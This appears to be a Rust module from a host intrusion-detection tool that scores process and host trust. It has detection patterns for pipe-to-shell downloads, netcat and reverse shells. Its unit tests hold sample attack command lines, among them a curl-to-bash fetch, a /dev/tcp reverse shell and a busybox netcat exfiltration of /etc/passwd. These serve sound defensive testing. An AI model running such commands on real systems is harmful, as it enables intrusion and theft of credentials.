use serde::Serialize;

use crate::engine::proc_tree::{RelatedDnsEvent, RelatedFileEvent, RelatedNetworkEvent};
use crate::model::process::ProcessNode;
use crate::model::ring0::Ring0Finding;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ProcessTrustAssessment {
    pub score: i32,
    pub reasons: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HostTrustAssessment {
    pub level: String,
    pub reasons: Vec<String>,
}

pub fn assess_process_trust(
    process: &ProcessNode,
    file_events: &[RelatedFileEvent],
    network_events: &[RelatedNetworkEvent],
    dns_events: &[RelatedDnsEvent],
) -> ProcessTrustAssessment {
    let mut score = 100;
    let mut reasons = Vec::new();

    if let Some(cmdline) = &process.cmdline {
        let lower = cmdline.to_ascii_lowercase();
        if lower.contains("curl ") || lower.contains("wget ") {
            score -= 25;
            reasons.push("command line contains remote retrieval utility".to_string());
        }
        if lower.contains("| bash") || lower.contains("| sh") {
            score -= 20;
            reasons.push("command line pipes content into shell".to_string());
        }
        if is_reverse_shell_cmdline(&lower) {
            score -= 30;
            reasons.push("command line matches a reverse shell pattern".to_string());
        }
        if lower.contains("nc ") || lower.contains("ncat ") {
            score -= 15;
            reasons.push("command line contains netcat-like tool".to_string());
        }
        if lower.contains("busybox ") {
            score -= 10;
            reasons.push("command line uses busybox multi-call binary".to_string());
        }
    }

    if let Some(exe_path) = &process.exe_path
        && (exe_path.starts_with("/tmp/")
            || exe_path.starts_with("/dev/shm/")
            || exe_path.starts_with("/var/tmp/"))
    {
        score -= 20;
        reasons.push("executable path is in a temporary directory".to_string());
    }

    let sensitive_file_count = file_events.iter().filter(|event| event.sensitive).count();
    if sensitive_file_count > 0 {
        score -= 25;
        reasons.push(format!(
            "accessed {} sensitive file event(s)",
            sensitive_file_count
        ));
    }

    let external_count = network_events.iter().filter(|event| event.external).count();
    if external_count > 0 {
        score -= 10;
        reasons.push(format!(
            "opened {} external network connection(s)",
            external_count
        ));
    }

    let lateral_count = network_events
        .iter()
        .filter(|event| event.lateral_movement_hint)
        .count();
    if lateral_count > 0 {
        score -= 20;
        reasons.push(format!(
            "showed {} lateral movement network hint(s)",
            lateral_count
        ));
    }

    let high_entropy_dns_count = dns_events.iter().filter(|event| event.high_entropy).count();
    if high_entropy_dns_count > 0 {
        score -= 20;
        reasons.push(format!(
            "issued {} high-entropy dns query event(s)",
            high_entropy_dns_count
        ));
    }

    if process.uid == Some(0) {
        score -= 5;
        reasons.push("process runs as uid 0".to_string());
    }

    score = score.clamp(5, 100);

    ProcessTrustAssessment { score, reasons }
}

pub fn assess_host_trust(findings: &[Ring0Finding]) -> HostTrustAssessment {
    if findings.is_empty() {
        return HostTrustAssessment {
            level: "L0".to_string(),
            reasons: vec!["no current ring0 findings".to_string()],
        };
    }

    let mut level = "L1";
    let mut reasons = Vec::new();

    for finding in findings {
        reasons.push(format!("{} via {}", finding.finding_type, finding.detector));

        if matches!(
            finding.finding_type.as_str(),
            "ebpf_diff"
                | "tainted_kernel"
                | "hidden_process"
                | "mirror_trap_hit"
                | "ghost_port_hit"
        ) {
            level = "L2";
        }
    }

    if findings.len() >= 3 {
        level = "L3";
        reasons.push("multiple concurrent ring0 findings".to_string());
    }

    HostTrustAssessment {
        level: level.to_string(),
        reasons,
    }
}

fn is_reverse_shell_cmdline(lower: &str) -> bool {
    (lower.contains("bash -i") || lower.contains("sh -i"))
        && (lower.contains("/dev/tcp/") || lower.contains("0>&1") || lower.contains(">& /dev/tcp/"))
}

#[cfg(test)]
mod tests {
    use crate::engine::proc_tree::{RelatedDnsEvent, RelatedFileEvent, RelatedNetworkEvent};
    use crate::model::process::ProcessNode;
    use crate::model::ring0::Ring0Finding;

    use super::{assess_host_trust, assess_process_trust};

    #[test]
    fn process_trust_drops_for_sensitive_and_lateral_behavior() {
        let process = ProcessNode {
            process_key: "tracee:4242:1".to_string(),
            pid: 4242,
            ppid: Some(1),
            process_guid: None,
            parent_process_key: None,
            exe_path: Some("/usr/bin/bash".to_string()),
            comm: Some("bash".to_string()),
            cmdline: Some("bash -c curl http://10.0.0.5/payload.sh | bash".to_string()),
            cwd: None,
            uid: Some(0),
            gid: None,
            loginuid: None,
            session_id: None,
            start_time: 1,
            exit_time: None,
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            trust_score: 50,
            trust_reasons_json: None,
            flags_json: None,
        };

        let files = vec![RelatedFileEvent {
            pid: 4242,
            event_name: "security_file_open".to_string(),
            file_path: "/etc/shadow".to_string(),
            flags: Some("O_RDONLY".to_string()),
            sensitive: true,
            observed_at: 1,
        }];
        let network = vec![RelatedNetworkEvent {
            pid: 4242,
            event_name: "tcp_connect".to_string(),
            remote_addr: Some("10.0.0.9".to_string()),
            remote_port: Some(22),
            external: false,
            lateral_movement_hint: true,
            observed_at: 2,
        }];

        let assessment = assess_process_trust(&process, &files, &network, &[]);
        assert!(assessment.score < 60);
        assert!(!assessment.reasons.is_empty());
    }

    #[test]
    fn process_trust_drops_for_reverse_shell_pattern() {
        let process = ProcessNode {
            process_key: "tracee:5252:1".to_string(),
            pid: 5252,
            ppid: Some(1),
            process_guid: None,
            parent_process_key: None,
            exe_path: Some("/usr/bin/bash".to_string()),
            comm: Some("bash".to_string()),
            cmdline: Some("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1".to_string()),
            cwd: None,
            uid: Some(0),
            gid: None,
            loginuid: None,
            session_id: None,
            start_time: 1,
            exit_time: None,
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            trust_score: 50,
            trust_reasons_json: None,
            flags_json: None,
        };

        let assessment = assess_process_trust(&process, &[], &[], &[]);
        assert!(assessment.score <= 65);
        assert!(
            assessment
                .reasons
                .iter()
                .any(|reason| reason.contains("reverse shell"))
        );
    }

    #[test]
    fn process_trust_drops_for_busybox_lolbin_pattern() {
        let process = ProcessNode {
            process_key: "tracee:7272:1".to_string(),
            pid: 7272,
            ppid: Some(1),
            process_guid: None,
            parent_process_key: None,
            exe_path: Some("/usr/bin/busybox".to_string()),
            comm: Some("busybox".to_string()),
            cmdline: Some("busybox nc 10.0.0.5 4444 < /etc/passwd".to_string()),
            cwd: None,
            uid: Some(0),
            gid: None,
            loginuid: None,
            session_id: None,
            start_time: 1,
            exit_time: None,
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            trust_score: 50,
            trust_reasons_json: None,
            flags_json: None,
        };

        let assessment = assess_process_trust(&process, &[], &[], &[]);
        assert!(assessment.score <= 70);
        assert!(
            assessment
                .reasons
                .iter()
                .any(|reason| reason.contains("busybox"))
        );
    }

    #[test]
    fn process_trust_drops_for_high_entropy_dns_queries() {
        let process = ProcessNode {
            process_key: "tracee:9090:1".to_string(),
            pid: 9090,
            ppid: Some(1),
            process_guid: None,
            parent_process_key: None,
            exe_path: Some("/usr/bin/bash".to_string()),
            comm: Some("bash".to_string()),
            cmdline: Some("bash -c nslookup suspicious".to_string()),
            cwd: None,
            uid: Some(0),
            gid: None,
            loginuid: None,
            session_id: None,
            start_time: 1,
            exit_time: None,
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            trust_score: 50,
            trust_reasons_json: None,
            flags_json: None,
        };
        let dns_events = vec![RelatedDnsEvent {
            pid: 9090,
            event_name: "net_packet_dns_request".to_string(),
            query: "dGhpcy1pcy1hLWRucy10dW5uZWwtcGF5bG9hZA.example.com".to_string(),
            query_type: Some("TXT".to_string()),
            query_class: Some("IN".to_string()),
            src: Some("127.0.0.1".to_string()),
            dst: Some("8.8.8.8".to_string()),
            src_port: Some(53000),
            dst_port: Some(53),
            entropy: 4.7,
            high_entropy: true,
            observed_at: 1,
        }];

        let assessment = assess_process_trust(&process, &[], &[], &dns_events);
        assert!(assessment.score <= 75);
        assert!(
            assessment
                .reasons
                .iter()
                .any(|reason| reason.contains("high-entropy dns"))
        );
    }

    #[test]
    fn host_trust_escalates_for_ebpf_findings() {
        let findings = vec![Ring0Finding {
            id: "ring0:bpftool:test".to_string(),
            finding_type: "ebpf_diff".to_string(),
            detector: "bpftool".to_string(),
            severity: 8,
            trust_level: "L2".to_string(),
            host_id: None,
            hostname: None,
            pid: None,
            object_ref: None,
            summary: "suspicious eBPF".to_string(),
            detail_json: None,
            observed_at: 1,
        }];

        let assessment = assess_host_trust(&findings);
        assert_eq!(assessment.level, "L2");
    }
}
